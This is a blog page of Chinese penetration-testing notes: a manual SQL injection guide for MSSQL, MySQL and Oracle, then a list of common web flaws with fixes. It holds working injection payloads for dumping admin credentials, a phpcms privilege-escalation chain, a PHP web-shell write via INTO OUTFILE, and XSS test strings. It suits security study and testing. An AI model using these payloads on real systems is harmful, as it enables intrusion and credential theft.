<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>oneplusone&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="oneplusone's blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="oneplusone's blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="oneplusone's blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="oneplusone&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oneplusone&#39;s blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">天行健，君子以自强不息</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-手工注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/04/18/手工注入/" class="article-date">
  <time datetime="2016-04-18T07:46:29.000Z" itemprop="datePublished">2016-04-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/18/手工注入/">MSSQL、MySQL、Oracle 手工注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="SqlServer_uFF1A"><a href="#SqlServer_uFF1A" class="headerlink" title="SqlServer："></a>SqlServer：</h3><p> 漏洞：前端漏洞(常规方法检测，有错误回显)，传递 get 参数的时候没有过滤，直接连接到 SQL 语句上。<br> ····<br>    1.判断注入点方法：加 ‘ 报错，或是加 and 1=1 返回正常，加 and 1=2 返回错误，aspx 一般都是 SqlServer。<br>    2.判断数据库版本：加 and 1=@@version。<br>    3.查看数据库其他信息：查看服务器所在主机名称：and 1=host_name() ，查看当前用户：and 1=current_user 获得当前用户，设为 Current_User，<br>    查看当前数据库：and 1=db_name()，获得数据库名称，设为 DB_NAME。<br>    4.判断数据表名：and 1=(select top 1 name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85) and name not in (select top N name from DB_NAME.Current_User.sysobjects where xtype=CHAR(85)))–，从 0 开始替换 N 返回表名。这个过程会得到一些有用的表，比如 XXX_admin，XXX_users==。<br>    5.对比较敏感的表进行进一步注入获得字段：and 1=(select top 1 Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00) and name not in(select top N Name from syscolumns where id=object_id(0x5700650062005F00410064006D0069006E00)))，从 0 开始替换 N 逐个返回列名。可能会获得一些有用的字段值，比如 username，password 等等。<br>    6.根据字段名称获得相应的字段内容：”and 1=(select top 1 [Column_Name] from XXX_admin)” 获得字段内容。XXX_admin 是获得的有用的表，Column_Name 是字段名称。<br>····</p>
<h3 id="Mysql_uFF1A"><a href="#Mysql_uFF1A" class="headerlink" title="Mysql："></a>Mysql：</h3><p>1.漏洞：前端漏洞（常规方法检测不到，用 %ce’ 检测有错误回显），GBK 宽字符转译导致的绕过 sql 注入安全检测。<br>    ①.找到存在漏洞的 URL，常规方法看不到回显，将参数改成 %ce’ ，有回显。<br>    ②.直接构造语句爆出后台账号密码：<a href="http://url/xxx.php?act=xxx&amp;xx=%ce’" target="_blank" rel="external">http://url/xxx.php?act=xxx&amp;xx=%ce’</a> and 1=1 union select 1 and (select 1 from(select count(<em>),concat((select concat(0x5b,user_name,0x3a,password,0x5d) FROM ecs_admin_user limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) %23<br>2.漏洞：前端漏洞(无错误回显)，wap/index.php 的 action 参数存在本地文件包含漏洞，包含可执行 sql 命令文件 field_add.inc.php，而在这个文件中如果参数为 action，没有任何限制和过滤就可以包含本地一个 .inc.php 的文件。field_add.inc.php 件可以看到，$dataformat 没有初始化，$sql 也没有初始化，所以可以直接调用 sql 命令。(怎么检测有这个漏洞？)<br>    ①.注册一个普通用户，查看自己的 ID,userid = 2。<br>    ②.构造 <a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member SET groupid=1 where<br>    userid=2。更改注册账号的 groupid（组id）为 1 ，也就是将注册的 test 账号的组从普通用户组改为管理员组。<br>    ③.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> update phpcms_member_cache SET groupid=1 where<br>    userid=2。更改注册账号在缓存表中的 groupid，使其不会因为缓存表未更改导致失败。<br>    ④.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin<br>    (userid,username,allowmultilogin,alloweditpassword) values(2,test,1,1)。将 test 用户插入管理员表，并赋予 test 用户管理员具有的相关权限（后台登录和修改密码的权限）。<br>    ⑤.<a href="http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=" target="_blank" rel="external">http://URL/phpcms/wap/index.php?action=../../formguide/admin/include/fields/datetime/field_add&amp;sql=</a> insert INTO phpcms_admin_role (userid,roleid)<br>    values(2,1)。将 test 角色信息插入管理员角色表，使 test 角色为管理员的角色。<br>    ⑥.用test用户登录，即是管理员。<br>3.漏洞：前端漏洞（常规方法检测，有错误回显），传递 get 参数的时候没有过滤，直接拼接到 SQL 语句上。<br>    ①.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    ②.判断字段长度：后面加上 order by N，从数字 1 开始替代 N，直到返回错误页面，判断字段长度为错误页面的 N-1，也就是最后一个正常页面返回。<br>    ③.判断字段位置回显：加上 and 1=2 union select 1,2,3,4,5,……,N-1 最后一个数为字段长度，有回显会将相应数字显示出来。<br>    ④.判断数据库信息：加上 and 1=2 union select 1,2,sql_command,4,5,6,7,8,9,10,11,……,N-1 用 sql 指令替换 sql_command。用 version(),database(),user() 替换。<br>    ！！！注意：这里所得到的当前用户必须是 DBA 或是系统管理员，否则是进行不下去的，因为后面要用到系统表。<br>    ⑤.判断 mysql 所有数据库：加上 and 1=2 union select 1,2,group_concat(convert(SCHEMA_NAME using latin1)),4,5,6,7,8,9,10,……,N-1 from<br>    information_schema.SCHEMATA ，查看 mysql 中所有数据库的名称。<br>    ⑥.判断数据库表：加上 and 1=2 union select 1,2,group_concat(convert(table_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.tables where<br>    table_schema=database()，查看当前数据库拥有的所有表。可以发现存放用户信息的表 XXX_users，XXX_admin。<br>    ⑦.判断数据表的所有列：加上 and 1=2 union select 1,2,group_concat(convert(column_name using latin1)),4,5,6,7,8,9,10,……,N-1 from information_schema.columns<br>    where table_name=0x636D735F7573657273。table_name=XXX_users，表名需要编码为 16 进制。可能会得到有用的列：userid，username，password 等等。<br>    ⑧.获取字段值：加上 and 1=2 union select 1,2,concat_ws(0x2b,userid,username,password),4,5,6,7,8,9,10,……,N-1 from cms.XXX<em>users。得到数据。<br>    ⑨.解密登陆。<br>4.漏洞：前端漏洞(有错误回显)，shopex 的 cookie 攻击漏洞。<br>    ①.判断注入点：注册账号并登陆，使用 firefox 的 cookiemanager 对 cookie 进行操作。查看 cookie，在 S[CUR] 值后面添加 ‘ 进行验证，发现页面没什么变化，再次使用<br>    ” 进行测试。从报错信息中可以获得表前缀为 sdb</em>，及 sql 语句拼接方式、数据库类型等等数据库信息。<br>    ②.判断字段数：使用” LIMIT 1,1 UNION ALL SELECT 11#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22#<br>    ” LIMIT 1,1 UNION ALL SELECT 11，22，33#<br>    ……<br>    判断当前表中的字段数，并确定页面显示的字段。从页面中可以判断出该表共有 N 个字段，并且页面显示的是第 X 个字段。（设 N=6，X=3）<br>    ③.查询系统管理员用户：在 shopex 中，管理员用户信息保存在 sdb_operators 表中，使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select count(*) from<br>    sdb_operators),44,55,66# 查询管理员人数。<br>    ④.查询管理员用户名和密码：加上 ” LIMIT 1,1 UNION ALL SELECT 11,22,(select username from sdb_operators limit 0,1),44,55,66# 查询用户名。得到用户名 xxxx。<br>    ⑤.使用” LIMIT 1,1 UNION ALL SELECT 11,22,(select userpass from sdb_operators where username=’xxxx’),44,55,66# 查询管理员密码。<br>    ⑥.解密登陆。<br>5.漏洞：DISCUZ 漏洞(有错误回显)：二次注入，在进行添加回复操作的时候，未对原先存在的 message 信息进行特殊字符过滤，且该 message 直接拼接到 sql 语句中，导致特殊<br>    sql 语句的执行。<br>6.漏洞：前端漏洞(无错误回显)：登陆绕过检测，网站有多处都调用并带入 admin_name 进行查询，虽然在 POST 数据时进行了过滤（首次提交返回错误页面的原因）。但因<br>    get_admin_one 函数和 check_admin 函数没有对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    对带入的 admin_name 进行校验或过滤，导致 sql 注入。<br>    在后台登陆界面用户名密码随便输，验证码填正确，burp 抓包：修改 POST 提交的数据，修改其中的 admin_name 值为 XXXX%d5′ or 1=1%23 ，<br>    其中 XXXX 为管理员账号，放行，第一次肯定不成功（因为在 post 数据时进行了过滤），刷新一下就能绕过直接进后台。</p>
<h3 id="Oracle_uFF1A"><a href="#Oracle_uFF1A" class="headerlink" title="Oracle："></a>Oracle：</h3><p>漏洞：前端漏洞(有错误回显)，get 参数未过滤直接拼接到 SQL 语句：<br>    1.常规方法检测注入点，有错误回显，可能直接返回数据库类型。<br>    2.判断数据库类型：在 url 后面添加 /<em>，页面返回错误，说明不是 mysql 数据库，然后使用 ‘and (select count(</em>) from user_tables)&gt;0– 返回正常，判断该数据库为<br>    oracle 数据库，因为只有 oracle 数据库才有 user_tables 表。<br>    3.获取字段数：使用’ order by 1 — ，通过变换数值，当页面报错时，则字段数就是报错之前的数，设当’ order by N– 页面报错，说明共有 N-1 个字段，设 N=5，通过<br>    ‘ union select null,null,null,null from user_tables order by 1 desc– 返回正常页面验证字段确实为 4 个。<br>    4.判断字段类型：通过<br>    ‘ union select ‘null’,null,null,null from user_tables order by 1 desc–<br>    ‘ union select null,’null’,null,null from user_tables order by 1 desc–<br>    ‘ union select null,null,’null’,null from user_tables order by 1 desc–<br>    ……<br>    判断各字段数据类型：那个返回正确说明那个就是字符型，否则可能是整型或其他类型。(设 2.3 是字符型)。<br>    5.判断各字段在页面中的显示位置：’ union select 1,’2′,’3′,4 from user_tables order by 1 desc– 可能得到 2.3.4 在网页中的显示位置。<br>    6.获取数据库表个数：使用 ‘ and (select count(<em>) from user_tables)=N–,N 从 0 开始 ++，返回正常即有 N 个表。<br>    7.猜测数据表名：使用 ‘ and 1=2 union select 1,’2’,table_name,4 from user_tables– 获取数据表名，设获得关键表名 XXX。<br>    8.判断账号数：利用 ‘ and (select count(</em>) from XXX)&gt;0 — 判断共有多少个账号，用数字替代 0，返回非正常页面证明账号个数为填入的数字。<br>    9.判断字段个数：使用 ‘ and (SELECT count(<em>) FROM USER_TAB_COLUMNS WHERE table_name=’XXX’)&gt;0–，通过替换数字 0，当页面出现错时，此时的数字就是该表的字段个数。<br>    设得到字段个数为 A=2。<br>    10.获取字段名：使用 ‘ and 1=2 union select 1,’2′,COLUMN_NAME,4 from (select </em> from (SELECT COLUMN_NAME FROM USER_TAB_COLUMNS WHERE table_name=’XXX’ order by 1 asc ) WHERE ROWNUM&lt;=A ORDER BY 1 DESC) WHERE ROWNUM&lt;=1，通过不断变换第一个 rownum 后面的数字（A–），可以得到该表的字段名称。设为 name,password.<br>    11.获取管理员信息：利用’ and 1=2 union select 1,name,password,4 from XXX — 获取管理员用户名和密码信息<br>    注入点导出一句话：<br>    在获取到字段数之后，直接联合查询 <a href="http://www.xxx.com/news.php?NewsID=-1" target="_blank" rel="external">http://www.xxx.com/news.php?NewsID=-1</a> union select ‘&lt;?php eval($_POST[cmd]);?&gt;’,2 into outfile ‘D:/wwwroot/eval.php’<br>    然后访问 eval.php。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/04/18/手工注入/" data-id="cin5pv33l0003hcfwzjiytr8y" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-yewuluoji" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/04/18/yewuluoji/" class="article-date">
  <time datetime="2016-04-18T06:53:37.000Z" itemprop="datePublished">2016-04-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##渗透项目常见漏洞<br><strong>1、业务逻辑漏洞：</strong><br>突破限制：如果只有有限个选择，那么就看能否在抓包之后修改继续往下走，比如金额，<br>–安全建议：<br> 服务器端对输入之后立即验证。</p>
<p>短信、邮件炸弹：在需要验证的地方，首先看手机号和邮箱号是否可修改，然后抓包重放，<br>–安全建议：<br> 1.服务器端控制发送验证码的频率和时间。<br> 2、从数据库中查询用户的银行预留手机号码或邮箱，再验证发送。而不是获取之后返回给用户界面再由用户提交该请求。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http 方法测试：</span><br><span class="line">options、head、get、post、<span class="keyword">delete</span>、trace 方法。</span><br><span class="line"><span class="number">1.</span>options 方法：</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入: options / http/<span class="number">1.1</span></span><br><span class="line"><span class="number">2.</span>head 方法:</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入：head / http/<span class="number">1.1</span></span><br><span class="line"><span class="number">3.</span>get 方法：</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入：get webview HTTP/<span class="number">1.0</span></span><br><span class="line"><span class="number">4.</span>使用 burp 向目标主机发包：</span><br><span class="line">options http:<span class="comment">//www.<span class="label">xxx.com HTTP/1.1</span></span></span><br><span class="line">Host: www.xxx.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36</span><br><span class="line">Content-Length: 2</span></span><br></pre></td></tr></table></figure>
<p>–安全建议：</p>
<p> 禁用 OPTIONS、TRACE 方法。</p>
<p>HttpOnly:<br>主要是为了限制 web 页面程序的 browser 端 script 序读取 cookie，防止恶意代码获取客户的敏感信息。可防止 XSS。<br>打开浏览器开发者工具在数据包中 cookie 栏可见。<br>–安全建议：</p>
<p> 修改源代码设置 httponly 属性。</p>
<p>SETCOOKIE 配置 SECURE:</p>
<p>Cookie 只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以绝对不会被窃听到，可以防止 cookie 泄露。<br>–安全建议：</p>
<p> 修改源代码设置 secure 属性。</p>
<p>图形验证码测试：<br>1.是否有干扰指纹，<br>2.验证码是否只能使用一次，账号密码出错、页面跳转之后是否变换验证码。<br>本地 js 验证可绕过。<br>–安全建议：</p>
<p> 加大字符扭曲化效果，避免使用单色背景，添加干扰指纹， 验证码只使用一次；服务器随机生成。</p>
<p>安全退出：<br>点击安全退出后，再点击浏览器 返回 按钮，再点击其他链接，看是否需要重新登录。<br>–安全建议：</p>
<p> 销毁会话。退出同时清除认证信息，确保用户安全退出</p>
<p><strong>越权：</strong><br>1.水平越权：<br>一般在有编号，订单号，账号，邮箱号，手机号等等地方，修改其号码为其他用户号码，看是否以号码为参数进行查询，从而验证水平越权，<br>–安全建议：</p>
<p>   1.通过会话信息在服务器端确认操作人的身份来控制。<br>   2.建议数据传输时，先做加密处理。<br>   3.提交的数据做特殊处理<br>   4.最小权限原则，A 用户只拥有 A 的资料信息。<br>    5.从服务器数据库中读取信息，而不是通过用户输入。</p>
<p>2.垂直越权：<br>低权限账户虽然没有高权限账户的处理模块，但是可以访问高权限账户的 URL，低权限账户可以构造高权限请求发包完成操作。<br>–安全建议：</p>
<p> 服务器响应客户端请求时，先认证身份，然后检查访问权限对相关页面进行访问权限控制和操作控制</p>
<p>明文传输：<br>抓包，查看关键信息是否加密，<br>–安全建议：</p>
<p> 加密敏感信息。</p>
<p>信息泄露：<br>错误请求，可能会爆出一些错误，这些信息中可能会有一些敏感信息，<br>敏感信息数据包中泄露，<br>安全建议：</p>
<p> 所有错误请求跳转到自定义错误页面，屏蔽服务器自身错误页面返回的信息，禁止返回 banner 信息，配置 web 服务器，IIS 可通过ServerMask 修改头部信息。<br> 服务器端增加容错机制，对异常进行捕获以及规避常规错误。<br> 加密敏感数据。<br> 修改数据库查询语句，限定查询结果。<br>  修改程序返回信息，限定服务器结果输出内容。<br>  限制信息接口调用，限制用户对程序接口调用获取信息。</p>
<p>CSRF：<br>–安全建议：</p>
<p> 判断请求 refer，<br> 关键操作时需要验证，<br>  在请求地址中增加 token 并验证，并且不要将所有认证信息放置在 cookie 中。</p>
<p>XSS：<br>反射型：<br>测试代码：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script&lt;script</span><br><span class="line">&lt;/script&lt;<span class="tag">iframe</span> src=javascript:<span class="function"><span class="title">alert</span><span class="params">(/xss/)</span></span></span><br><span class="line">aaa”&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script <span class="hexcolor">#aaa</span> 为 get 参数。</span><br><span class="line">aaa”&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script</span><br><span class="line">aaa” onmouseover=<span class="function"><span class="title">alert</span><span class="params">(/xss/)</span></span> bad=”</span><br><span class="line">“‘&lt;<span class="tag">img</span> src=<span class="number">1</span> onerror=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>”&lt;body/onload=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
<p>–安全建议：</p>
<p> 1：网络防火墙 WAF 产品，可以防止带有恶意参数的交互，防止跨站脚本攻击。<br>  2：修改网站源代码，对用户输入过滤对输入进行 HTML 编码。 URL 结尾禁止添加脚本语句并限制输入位置的字符串长度 URL 过滤相应关键字，例如： &lt;、script、alert、document、cookie 编写 filter过滤相关特殊字符，限制提交跨站语句对于客户端提交的数据，再次向客户端输出之前需要进行处理。如果确认客户端只允许提交文本，则应对文本进行HTMLEncode 之后输出；如果确认客户端允许输入富文本，则应对一些危险的 Javascript 脚本、HTML 元素进行过滤后输出。</p>
<p>SessionID：<br>以 get 方式向服务器发送请求，<br>–安全建议：</p>
<p> 采用 post 方式请求，服务器控制保证每个用户同时只存在一个会话。</p>
<p>会话管理不严谨：<br>不安全的直接对象引用，或 会话过期时间可抓包修改。<br>–安全建议：</p>
<p> 对存在问题的参数使用间接对象引用，结合用户的登录状态及权限；<br> 服务器端控制会话过期时间。</p>
<p>会话固定：<br>登录前后 sessionid 不变；<br>–安全建议：</p>
<p> 修改登录部分代码，登录成功后生成新的会话传递认证信息。</p>
<p>敏感信息可修改：<br>在转账等等时候，填入账户抓包后可修改收款人账号。<br>–安全建议：</p>
<p> 1.建议数据传输时，先做加密处理；<br> 2.提交的数据做特殊处理；</p>
<p>暴力破解：<br>–安全建议：</p>
<p> 1.任何拥有用户登录功能的页面都需要使用图型验证码；<br> 2.设置登录失败多少次后进行帐户锁定；<br> 3.设置密码要求密码复杂度。</p>
<p>验证码超时可用：<br>用已超时的验证码验证，如果可用即存在验证码爆破。<br>–安全建议：</p>
<p> 1：超时后强制使验证码失效。<br> 2：添加图型验证码，以防止暴力破解。</p>
<p>登录：<br>用户名不正确提示用户名不存在，用户名正确密码错误提示密码不匹配，有可能提示是”用户名或密码错误”，但是如果发包的返回结果可能会不一样，更细致的检测需要通过前段发包来看回显。<br>–安全建议：</p>
<p> 均提示用户名或密码错误，发包也提示一样的错误。</p>
<p>嵌入页面钓鱼攻击：<br>在一些链接中，提交代码，伪造某一网站，进行嵌入页面钓鱼攻击。<br>–waf 设备，过滤提交数据。</p>
<p>URL 重定向：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/logout?service=http:<span class="comment">//www.hack.com</span></span><br></pre></td></tr></table></figure>
<p>–安全建议：</p>
<p> 修复程序存在问题的参数，限制页面跳转功能；<br> 若 returnURL 不属于本站点范围内，则立即跳转至统一错误页面。</p>
<p>第三方编辑器：<br>fckeditor==。<br>–安全建议：</p>
<p> 建议采用自制开发的编辑器或者对此页面进行访问控制。</p>
<p>权限回收：<br>在低权限用户登录状态下，权限被收回，依然可执行权限。<br>–安全建议：</p>
<p> 对用户的登陆状态进行实时处理。</p>
<p>金额负数：<br>–安全建议：</p>
<p> 验证数据，强制正数。</p>
<p>负数汇款出现错误，但是增加了日限额。<br>–安全建议：</p>
<p> 时刻检查金额，不符合立马操作错误并终止后续操作。</p>
<p>配置文件泄露：<br>–安全建议：</p>
<p> 将 xml 等配置文件放在非 Web 访问目录，或将相关敏感文件存放入 /WEB-INF/ 目录，这个目录受 servlet<br> 容器保护，可以避免被浏览器直接访问，或者实现一个 Filter，拦截对 /xml 目录的 http 请求。</p>
<p>加密参数可修改为明文：<br>部分提交数据经过了加密，但是修改为明文值提交也能通过。<br>安全建议：</p>
<p> 通过会话信息在服务器端确认操作人的身份，服务器端对提交数据格式进行校验。</p>
<p>密码修改：<br>可构造数据包，直接替换账户密码修改任意用户口令。<br>–安全建议：</p>
<p> 禁止危险 http 方法，修改口令同时提交短息验证信息。</p>
<p>短息验证码绕过：<br>乱输短息验证码，返回验证码错误，删除响应包体，即可能绕过。<br>–安全建议：</p>
<p> 在服务器端对提交的数据进行验证合法性。</p>
<p>上传：<br>–安全建议：</p>
<p> 1、同时在客户端和服务端对上传文件类型进行限制,白名单 ==，禁止脚本文件上传。<br> 2、对上传文件进行改名、转码，或上传至单独文件服务器，阻止脚本文件解析执行。<br> 3、并对存储上传文件的目录设置权限，去掉解析权限。</p>
<p>IIS 短文件和文件名泄露：<br>验证： <code>http://target.com/a*~1*/.aspx</code><br>–安全建议：</p>
<p> 1.关闭 windows 的 8.3 短文件名功能，或对 404 以及 400 页面进行统一处理。<br> 2.过滤输入提交数据中的 ~ 符号。<br> 3.如果 web 环境不需要 asp.net 的支持，进入 Internet 信息服务(IIS)管理器 — Web 服务扩展 – ASP.NET 选择禁止此功能。<br> 4.升级 net framework 至 4.0 以上版本。</p>
<p>允许关键字为空的全文检索：<br>由于网站全文检索功能需要调用较多的资源进行数据库查询，因此允许关键字为空的全文检索功能可能会导致基于查询性能的拒绝服务攻击（如 CC 攻击）。<br>–安全建议：</p>
<p> 在服务器端检查搜索输入提交值。</p>
<p>httpoOnly 信息泄露：<br>如果用户发送大于 4K 的 cookie 时，系统会返回一个错误，并且把所有的 cookie 完整的在页面中显示出来。<br>–升级 Apache 版本。</p>
<p>慢 DDoS 攻击：<br>原因：web sever 未限制 HTTP 头部传输的最大许可时间。<br>–安全建议：</p>
<p> 根据 web 服务器性能和带宽流量，以及业务的访问数量，调整 web 中间件配置文件的 timeout 等参数，或者使用专业的抗 ddos 设备来进行防护。<br> 建议通过 web 中间件限制单个 IP 的最大连接数在合理的数值内。 在 apache 服务器上添加 mod_antiloris 模块等方法缓解 Dos 慢速攻击。</p>
<p>路径、目录遍历：<br>–安全建议：</p>
<p> 将 Web 服务器配置成拒绝列出目录并删除无用的目录。</p>
<p>后台泄露：<br>直接 IP + 端口访问后台： xx.xx.xx.xx:8080 到后台。<br>–安全建议：</p>
<p> 隐藏此设备后台地址，或者禁止外网 IP 访问。</p>
<p>.svn 泄露：<br>–安全建议：</p>
<p> 建议删除 svn 同步产生的日志文件即可。</p>
<p>任意文件下载：<br>–安全建议：</p>
<p> 对 download.jsp/asp/php 进行源代码审计然后修改函数，限制路径权限，参数不直接传文件名。</p>
<p>构造文件上传：<br>发现有第三方应用(ueditor/fckeditor==)有可用的上传接口(–/ueditor/fileup.jsp)，本地构造上传表单：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html</span><br><span class="line">&lt;title</span><br><span class="line">New <span class="keyword">file</span> upload</span><br><span class="line">&lt;/title</span><br><span class="line">&lt;body </span><br><span class="line">&lt;<span class="keyword">form</span> <span class="keyword">action</span> =”http://<span class="type">target</span>.com/ueditor/jsp/fileUp.jsp” method=”post” <span class="keyword">name</span>=”<span class="keyword">form</span>” enctype=”multipart/<span class="keyword">form</span>-<span class="type">data</span>”</span><br><span class="line">Upload <span class="keyword">file</span>:&lt;br/</span><br><span class="line">&lt;input <span class="keyword">name</span>=”NewFile” <span class="keyword">type</span>=”<span class="keyword">FILE</span>” </span><br><span class="line">&lt;input <span class="keyword">type</span>=”submit” <span class="keyword">name</span>=”Submit” <span class="keyword">value</span>=”上传” </span><br><span class="line">&lt;/<span class="keyword">form</span></span><br><span class="line">&lt;/body</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>
<p>本地保存为 D://upload.html 本地访问：file:///D://upload.html 可上传文件。<br>–安全建议：</p>
<p> 对上传功能进行安全加固，对文件格式、内容进行严格校验。</p>
<p>失效的身份认证和会话管理：<br>Cookie 的前后台管理缺陷。<br>后台、前台在同一个浏览器里相继登录导致 JSESSIONID 被冲掉的一个全过程如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、打开 chrome，打开后台页面，此时 JSESSIONID=</span><br><span class="line">后台初始</span><br><span class="line"><span class="number">71</span>DF533CBF1C4F391B7E0A66807E48E5<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">2</span>、登录 super 用户之后，JSESSIONID 变为</span><br><span class="line">后台合法</span><br><span class="line"><span class="number">357</span>AA84909574CD534F98A680A3880AC<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">3</span>、同一个浏览器内打开前台系统，JSESSIONID 为</span><br><span class="line">前台继承</span><br><span class="line"><span class="number">357</span>AA84909574CD534F98A680A3880AC<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">4</span>、登录前台系统，此时前台系统变为</span><br><span class="line">前台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">5</span>、回到后台标签，F12 重新打开，发现已被冲掉</span><br><span class="line">后台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">6</span>、使用后台用户查询，发现使用的是非法 cookie</span><br><span class="line">后台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">7</span>、禁用某后台用户，发现使用的仍是非法 cookie</span><br><span class="line">后台</span><br><span 